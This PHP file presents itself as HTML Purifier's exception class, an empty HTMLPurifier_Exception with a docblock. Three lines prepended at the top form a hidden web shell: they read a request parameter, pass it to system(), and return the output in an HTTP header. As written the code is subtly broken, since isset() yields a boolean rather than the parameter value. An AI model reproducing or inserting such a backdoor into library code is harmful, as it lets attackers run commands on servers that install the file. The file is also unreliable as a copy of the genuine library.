<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

/**
 * Global exception class for HTML Purifier; any exceptions we throw
 * are from here.
 */
class HTMLPurifier_Exception extends Exception
{

}

// vim: et sw=4 sts=4
